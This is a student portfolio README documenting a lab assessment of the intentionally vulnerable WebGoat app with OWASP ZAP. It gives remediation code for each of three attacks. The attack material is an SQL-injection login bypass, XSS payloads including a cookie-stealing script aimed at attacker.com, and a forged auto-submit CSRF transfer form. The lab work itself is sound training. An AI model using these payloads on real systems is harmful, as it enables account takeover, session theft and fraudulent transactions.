# 🔐 Web Application Security Testing with OWASP ZAP

**Author:** Perikala Anusha  
**Portfolio:** [anusha-cybersecurity-portfolio.vercel.app](https://anusha-cybersecurity-portfolio.vercel.app)  
**GitHub:** [github.com/Anusha2819](https://github.com/Anusha2819)  
**LinkedIn:** [linkedin.com/in/perikala-anusha-76b214316](https://linkedin.com/in/perikala-anusha-76b214316)  
**Date:** February 2026  
**Context:** Redynox Cyber Security Internship — Task 2

---

## 📌 Project Overview

This project demonstrates a complete **web application security assessment** using OWASP ZAP 2.15 and WebGoat 8.2.2 — the industry-standard intentionally vulnerable application used for security training.

Three critical vulnerabilities were manually exploited and documented with code-level mitigations:

| Vulnerability | CWE | CVSS Score | Severity |
|--------------|-----|-----------|---------|
| SQL Injection | CWE-89 | 9.8 | 🔴 Critical |
| Cross-Site Scripting (XSS) | CWE-79 | 8.8 | 🔴 High |
| Cross-Site Request Forgery (CSRF) | CWE-352 | 7.4 | 🟠 High |

> ⚠️ **Ethics Note:** All testing was performed exclusively on **WebGoat** — an intentionally vulnerable application running on localhost, designed specifically for security training. No real-world applications were tested.

---

## 🛠️ Environment Setup

| Component | Details |
|-----------|---------|
| Target App | WebGoat 8.2.2 (localhost:8080) |
| Proxy Tool | OWASP ZAP 2.15 (127.0.0.1:8090) |
| Browser | Firefox + FoxyProxy extension |
| OS | Windows + Kali Linux (WSL2) |
| Scan Type | Traditional Spider + Ajax Spider |

### Setup Steps
```bash
# 1. Start WebGoat on localhost
java -jar webgoat-server-8.2.2.jar --server.port=8080

# 2. Configure ZAP proxy
# ZAP Listen Address: 127.0.0.1:8090
# Firefox FoxyProxy: point to 127.0.0.1:8090

# 3. Open WebGoat in Firefox
# http://localhost:8080/WebGoat
```

---

## 🔍 Automated Scan Results

**Command:** Traditional Spider + Ajax Spider via OWASP ZAP 2.15

```
URLs Discovered:    59
Total Alerts:       19
High Severity:       3  (SQL Injection)
Medium Severity:     8
Low Severity:        8
```

---

## 🚨 Vulnerability 1 — SQL Injection (CVSS 9.8)

### Details
| Field | Value |
|-------|-------|
| CWE | CWE-89 |
| CVSS | 9.8 (Critical) |
| Type | Authentication Bypass via SQLi |
| Location | WebGoat Login Form |

### Exploitation
**Payload used:**
```sql
admin'--
```

**What happened:**
- The `'` character closes the SQL string
- `--` comments out the rest of the query (including the password check)
- The resulting SQL becomes: `SELECT * FROM users WHERE username='admin'--' AND password='anything'`
- Authentication bypassed — admin access gained **without knowing the password**

**Proof of Concept:**
```
Username: admin'--
Password: anything
Result:   ✅ Logged in as admin
```

### Remediation
```java
// ❌ VULNERABLE CODE
String query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";

// ✅ FIXED CODE — PreparedStatement (Parameterised Query)
PreparedStatement stmt = connection.prepareStatement(
    "SELECT * FROM users WHERE username=? AND password=?"
);
stmt.setString(1, username);
stmt.setString(2, password);
```

---

## 🚨 Vulnerability 2 — Reflected XSS (CVSS 8.8)

### Details
| Field | Value |
|-------|-------|
| CWE | CWE-79 |
| CVSS | 8.8 (High) |
| Type | Reflected Cross-Site Scripting |
| Risk | Session Hijacking, Cookie Theft |

### Exploitation
**Payloads used:**
```html
<!-- Payload 1: Basic script injection -->
<script>alert('XSS')</script>

<!-- Payload 2: Event handler bypass -->
<img src=x onerror="alert(document.cookie)">

<!-- Payload 3: Session hijacking -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**What happened:**
- User input was reflected directly in the page without sanitisation
- JavaScript executed in the victim's browser context
- Demonstrated ability to steal session cookies → session hijacking risk

### Remediation
```java
// ❌ VULNERABLE — direct output
out.println("<p>Hello " + userInput + "</p>");

// ✅ FIXED — encode output + Content Security Policy
import org.owasp.encoder.Encode;
out.println("<p>Hello " + Encode.forHtml(userInput) + "</p>");
```

```
HTTP Header Fix:
Content-Security-Policy: default-src 'self'; script-src 'self'
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

---

## 🚨 Vulnerability 3 — CSRF (CVSS 7.4)

### Details
| Field | Value |
|-------|-------|
| CWE | CWE-352 |
| CVSS | 7.4 (High) |
| Type | Cross-Site Request Forgery |
| Impact | Unauthorised fund transfer ($5,000) |

### Exploitation
**Attack HTML (hosted on attacker's site):**
```html
<!-- Forged auto-submit form — victim visits this page -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://localhost:8080/WebGoat/transfer" method="POST">
      <input type="hidden" name="to_account" value="attacker_account">
      <input type="hidden" name="amount" value="5000">
    </form>
  </body>
</html>
```

**What happened:**
- Victim visits attacker's page while logged into WebGoat
- Form auto-submits using victim's session cookie
- **$5,000 transfer completed WITHOUT victim's knowledge or interaction**

### Remediation
```java
// ✅ FIX 1 — CSRF Token validation
String csrfToken = generateSecureToken();
session.setAttribute("csrf_token", csrfToken);

// In form:
// <input type="hidden" name="csrf_token" value="${csrfToken}">

// Server-side validation:
if (!request.getParameter("csrf_token").equals(session.getAttribute("csrf_token"))) {
    throw new SecurityException("CSRF token mismatch!");
}
```

```
HTTP Cookie Fix:
Set-Cookie: sessionId=abc123; SameSite=Strict; HttpOnly; Secure
```

---

## 📊 Complete Findings Summary

| # | Vulnerability | CVSS | Impact | Fixed With |
|---|--------------|------|--------|-----------|
| 1 | SQL Injection (Auth Bypass) | 9.8 🔴 | Admin access without credentials | PreparedStatement |
| 2 | Reflected XSS | 8.8 🔴 | Session hijacking, cookie theft | Encode.forHtml() + CSP |
| 3 | CSRF (Fund Transfer) | 7.4 🟠 | $5,000 unauthorised transfer | CSRF tokens + SameSite |

---

## 💡 Key Learnings

1. **SQLi is still #1 on OWASP Top 10** — parameterised queries are non-negotiable
2. **XSS requires both input validation AND output encoding** — one alone is not enough
3. **CSRF tokens must be unique per session** — predictable tokens offer no protection
4. **Defence in depth** — layering CSP + HttpOnly + SameSite catches what single fixes miss
5. **Automated scanning finds surface-level issues** — manual exploitation reveals true depth of risk
6. **Documentation matters** — every finding needs proof-of-concept + remediation to be actionable

---

## 🔗 Related Projects

| Project | Link |
|---------|------|
| 🛡️ iptables Firewall | [github.com/Anusha2819/iptables-firewall-kali-linux](https://github.com/Anusha2819/iptables-firewall-kali-linux) |
| 🗺️ Nmap Host Enumeration | [github.com/Anusha2819/nmap-host-enumeration](https://github.com/Anusha2819/nmap-host-enumeration) |
| 🌐 Live Portfolio | [anusha-cybersecurity-portfolio.vercel.app](https://anusha-cybersecurity-portfolio.vercel.app) |

---

## ⚖️ Legal & Ethical Disclaimer

All testing performed exclusively on **WebGoat 8.2.2** running on localhost — an application **intentionally designed for security training**. No real applications, live systems, or third-party targets were tested. This project is for **educational and portfolio purposes only**.

---

*Part of Perikala Anusha's Cybersecurity Portfolio — [anusha-cybersecurity-portfolio.vercel.app](https://anusha-cybersecurity-portfolio.vercel.app)*
